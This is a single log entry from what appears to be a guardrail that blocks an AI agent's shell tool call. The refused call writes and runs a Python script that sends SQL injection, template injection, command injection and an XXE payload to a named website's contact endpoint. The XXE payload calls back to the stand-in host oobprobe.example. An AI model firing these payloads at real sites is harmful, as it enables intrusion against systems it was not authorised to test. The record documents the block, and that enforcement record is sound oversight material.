{"ts": 1790725918.2331724, "decision_id": "2a030e32b5d8", "tool": "run_shell", "allow": false, "reason": "out-of-scope target blocked: oobprobe.example", "target": "cd /work && cat > tool_outputs/send_probe.py <<'PYEOF'\nimport subprocess, json, time\nT=\"https://www.infinitycapital.bh\"\ndef post(data, ct=\"application/x-www-form-urlencoded\", hdrs=None, tag=\"s\"):\n    cmd=[\"curl\",\"-s\",\"-X\",\"POST\",\"-H\",\"Content-Type: \"+ct,\"--data\",data,T+\"/api/send\",\n         \"-o\",\"/tmp/sp\",\"-D\",\"/tmp/sph\",\"-w\",\"%{http_code}|%{size_download}|%{time_total}\"]\n    for k,v in (hdrs or {}).items(): cmd+=[\"-H\",f\"{k}: {v}\"]\n    r=subprocess.run(cmd,capture_output=True,text=True)\n    h=open(\"/tmp/sph\",errors=\"ignore\").read()\n    g=lambda k:[l.split(\":\",1)[1].strip() for l in h.split(\"\\n\") if l.lower().startswith(k)]\n    b=open(\"/tmp/sp\",\"rb\").read()\n    return r.stdout.strip(), g(\"x-matched-path\"), g(\"x-vercel-mitigated\"), b[:400]\n\ncases = {\n \"empty\":                 \"\",\n \"only-empty-json\":       json.dumps({}),\n \"name-only\":             \"name=probe\",\n \"full-form-novalidate\":  \"name=A&email=a@b.c&message=hi\",\n \"sql-in-name\":           \"name=A'%20AND%20SLEEP(6)--%20-&email=a@b.c&message=hi\",\n \"sqli-email\":            \"name=A&email=a%40b.c'%20OR%20'1'='1&message=hi\",\n \"sqli-msg-union\":        \"name=A&email=a%40b.c&message=x'%20UNION%20SELECT%20null--%20-\",\n \"ssti-name\":             \"name={{7*7}}&email=a%40b.c&message=hi\",\n \"cmdi-name\":             \"name=A;id&email=a%40b.c&message=hi\",\n \"array-name\":            \"name[]=A&name[]=B&email=a%40b.c&message=hi\",\n \"json-body-formct\":      '{\"name\":\"A\",\"email\":\"a@b.c\",\"message\":\"hi\"}',\n \"xml-body\":              '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://oobprobe.example/x\">]><r>&x;</r>',\n}\nfor name,data in cases.items():\n    ct = \"application/xml\" if name==\"xml-body\" else \"application/x-www-form-urlencoded\"\n    if name==\"json-body-formct\": ct=\"application/x-www-form-urlencoded\"\n    st,xmp,mit,b = post(data, ct, tag=name)\n    print(f\"--- {name:<22} {st} xmp={xmp} mit={mit}\")\n    print(\"    body:\", b[:250])\n    time.sleep(0.5)\nPYEOF\ntimeout 250 python3 tool_outputs/send_probe.py 2>&1 | tee tool_outputs/send_probe.log"}
